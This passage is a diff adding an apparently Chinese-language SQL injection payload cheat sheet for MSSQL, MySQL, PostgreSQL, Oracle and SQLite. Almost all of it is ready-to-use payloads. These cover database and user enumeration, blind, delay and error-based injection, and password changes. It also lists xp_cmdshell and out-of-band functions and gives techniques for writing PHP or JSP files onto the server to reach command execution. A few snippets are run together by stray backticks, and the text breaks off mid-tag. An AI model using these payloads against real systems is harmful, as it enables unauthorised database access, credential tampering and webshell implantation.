+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Ascii&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT char(0x41)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT ascii(&#39;A&#39;)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT char(65)+char(66)&lt;/code&gt;  =&amp;gt; return  &lt;code&gt;AB&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Delay&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;WAITFOR DELAY &#39;0:0:3&#39;&lt;/code&gt;  pause for 3 seconds&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Change Password&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;ALTER LOGIN [sa] WITH PASSWORD=N&#39;NewPassword&#39;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Trick&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;id=1 union:select password from:user&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;文件读取&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;OpenRowset&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;当前查询语句&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;hostname&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;用于判断是否站库分离&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;select host_name()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;exec xp_getnetname&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;服务器信息&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;exec xp_msver&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;系统配置&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;select * from sys.configurations;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;注册表读写&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注册表读写&#34;&gt;#&lt;/a&gt; 注册表读写&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;xp_regread&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;exec xp_regread N&#39;HKEY_LOCAL_MACHINE&#39;, N&#39;SYSTEM\CurrentControlSet\Services\MSSEARCH&#39;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;xp_regwrite&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;xp_regdeletvalue&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;xp_regdeletkey&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;xp_regaddmultistring&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;报错注入-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错注入-2&#34;&gt;#&lt;/a&gt; 报错注入&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;1=convert(int,(db_name()))&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;常用函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用函数&#34;&gt;#&lt;/a&gt; 常用函数&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;SUSER_NAME()&lt;/li&gt;
+&lt;li&gt;USER_NAME()&lt;/li&gt;
+&lt;li&gt;PERMISSIONS()&lt;/li&gt;
+&lt;li&gt;DB_NAME()&lt;/li&gt;
+&lt;li&gt;FILE_NAME()&lt;/li&gt;
+&lt;li&gt;TYPE_NAME()&lt;/li&gt;
+&lt;li&gt;COL_NAME()&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;dns-oob&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns-oob&#34;&gt;#&lt;/a&gt; DNS OOB&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;fn_xe_file_target_read_file&lt;/li&gt;
+&lt;li&gt;fn_get_audit_file&lt;/li&gt;
+&lt;li&gt;fn_trace_gettable&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;其他常用存储过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他常用存储过程&#34;&gt;#&lt;/a&gt; 其他常用存储过程&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;sp_execute_external_script&lt;/li&gt;
+&lt;li&gt;sp_makewebtask&lt;/li&gt;
+&lt;li&gt;sp_OACreate&lt;/li&gt;
+&lt;li&gt;sp_OADestroy&lt;/li&gt;
+&lt;li&gt;sp_OAGetErrorInfo&lt;/li&gt;
+&lt;li&gt;sp_OAGetProperty&lt;/li&gt;
+&lt;li&gt;sp_OAMethod&lt;/li&gt;
+&lt;li&gt;sp_OASetProperty&lt;/li&gt;
+&lt;li&gt;sp_OAStop&lt;/li&gt;
+&lt;li&gt;xp_cmdshell&lt;/li&gt;
+&lt;li&gt;xp_dirtree&lt;/li&gt;
+&lt;li&gt;xp_enumerrorlogs&lt;/li&gt;
+&lt;li&gt;xp_enumgroups&lt;/li&gt;
+&lt;li&gt;xp_fixeddrives&lt;/li&gt;
+&lt;li&gt;xp_getfiledetails&lt;/li&gt;
+&lt;li&gt;xp_loginconfig&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;mysql-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-payload&#34;&gt;#&lt;/a&gt; MySQL Payload&lt;/h2&gt;
+&lt;h3 id=&#34;常见payload-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload-2&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Version&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT @@version&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Comment&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT 1 -- comment&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT 1 # comment&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT /*comment*/1&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Space&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;0x9&lt;/code&gt;   &lt;code&gt;0xa-0xd&lt;/code&gt;   &lt;code&gt;0x20&lt;/code&gt;   &lt;code&gt;0xa0&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Current User&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT user()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT system_user()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT current_role()&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;List User&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT user FROM mysql.user&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Current Database&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT database()&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;List Database&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT schema_name FROM information_schema.schemata&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;List Tables&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != &#39;mysql&#39; AND table_schema != &#39;information_schema&#39;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;List Columns&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != &#39;mysql&#39; AND table_schema != &#39;information_schema&#39;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;If&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT if(1=1,&#39;foo&#39;,&#39;bar&#39;);&lt;/code&gt;  return &#39;foo&#39;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Ascii&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;`SELECT char(0x41)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT ascii(&#39;A&#39;)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT 0x414243&lt;/code&gt;  =&amp;gt; return  &lt;code&gt;ABC&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Delay&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;sleep(1)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT BENCHMARK(1000000,MD5(&#39;A&#39;))&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Read File&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;select @@datadir``select load_file(&#39;databasename/tablename.MYD&#39;)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Blind&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;ascii(substring(str,pos,length)) &amp;amp; 32 = 1&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Error Based&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;select count(*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2))&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Change Password&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;mysql -uroot -e &amp;quot;use mysql;UPDATE user SET password=PASSWORD(&#39;newpassword&#39;) WHERE user=&#39;root&#39;;FLUSH PRIVILEGES;&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;报错注入常见函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错注入常见函数&#34;&gt;#&lt;/a&gt; 报错注入常见函数&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;extractvalue&lt;/li&gt;
+&lt;li&gt;updatexml&lt;/li&gt;
+&lt;li&gt;GeometryCollection&lt;/li&gt;
+&lt;li&gt;linestring&lt;/li&gt;
+&lt;li&gt;multilinestring&lt;/li&gt;
+&lt;li&gt;multipoint&lt;/li&gt;
+&lt;li&gt;multipolygon&lt;/li&gt;
+&lt;li&gt;polygon&lt;/li&gt;
+&lt;li&gt;exp&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;写文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写文件&#34;&gt;#&lt;/a&gt; 写文件&lt;/h3&gt;
+&lt;h4 id=&#34;写文件前提&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写文件前提&#34;&gt;#&lt;/a&gt; 写文件前提&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;root 权限&lt;/li&gt;
+&lt;li&gt;知晓文件绝对路径&lt;/li&gt;
+&lt;li&gt;写入的路径存在写入权限&lt;/li&gt;
+&lt;li&gt;secure_file_priv 允许向对应位置写入&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;select count(file_priv) from mysql.user&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;基于into写文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于into写文件&#34;&gt;#&lt;/a&gt; 基于 into 写文件&lt;/h4&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;outfile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/tmp/demo.txt&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;dumpfile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/tmp/demo.txt&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;dumpfile 和 outfile 不同在于，outfile 会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏&lt;/p&gt;
+&lt;h4 id=&#34;基于log写文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于log写文件&#34;&gt;#&lt;/a&gt; 基于 log 写文件&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;show variables like &#39;%general%&#39;;
+set global general_log = on;
+set global general_log_file = &#39;/path/to/file&#39;;
+select &#39;&amp;lt;?php var_dump(&amp;quot;test&amp;quot;);?&amp;gt;&#39;;
+set global general_log_file = &#39;/original/path&#39;;
+set global general_log = off;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;postgressql-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#postgressql-payload&#34;&gt;#&lt;/a&gt; PostgresSQL Payload&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Version
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT version()&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Comment
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT 1 -- comment``SELECT /*comment*/1&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Current User
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT user&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT current_user&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;``SELECT session_user`&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT getpgusername()&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;List User
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT usename FROM pg_user&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Current Database
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT current_database()&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;List Database
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT datname FROM pg_database&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Ascii
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT char(0x41)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT ascii(&#39;A&#39;)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Delay
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;pg_sleep(1)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;oracle-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#oracle-payload&#34;&gt;#&lt;/a&gt; Oracle Payload&lt;/h2&gt;
+&lt;h3 id=&#34;常见payload-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload-3&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;dump&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;select * from v$tablespace;``select * from user_tables;``select column_name from user_tab_columns where table_name = &#39;table_name&#39;;``select column_name, data_type from user_tab_columns where table_name = &#39;table_name&#39;;``SELECT * FROM ALL_TABLES&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Comment&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;--``/**/&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Space&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;0x00&lt;/code&gt;   &lt;code&gt;0x09&lt;/code&gt;   &lt;code&gt;0xa-0xd&lt;/code&gt;   &lt;code&gt;0x20&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;报错&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;utl_inaddr.get_host_name``ctxsys.drithsx.sn``ctxsys.CTX_REPORT.TOKEN_TYPE``XMLType``dbms_xdb_version.checkin``dbms_xdb_version.makeversioned``dbms_xdb_version.uncheckout``dbms_utility.sqlid_to_sqlhash``ordsys.ord_dicom.getmappingxpath``utl_inaddr.get_host_name``utl_inaddr.get_host_address&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;OOB&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;utl_http.request``utl_inaddr.get_host_address``SYS.DBMS_LDAP.INIT``HTTPURITYPE``HTTP_URITYPE.GETCLOB&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;绕过&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;rawtohex&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;写文件-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写文件-2&#34;&gt;#&lt;/a&gt; 写文件&lt;/h3&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt; directory TEST_DIR &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/path/to/dir&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;grant&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;write&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; directory TEST_DIR &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; system&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;declare&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   isto_file utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;file_type&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;begin&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   isto_file :&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fopen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;TEST_DIR&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test.jsp&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;W&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;put_line&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;isto_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;% out.println(&#34;test&#34;); %&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fflush&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;isto_file&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fclose&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;isto_file&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;sqlite3-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sqlite3-payload&#34;&gt;#&lt;/a&gt; SQLite3 Payload&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Comment
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;--&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/**/&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Version
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;select sqlite_version();&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Command Execution&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ATTACH &lt;span class=&#34;token keyword&#34;&gt;DATABASE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/var/www/lol.php&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; lol&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; lol&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pwn &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dataz &lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token 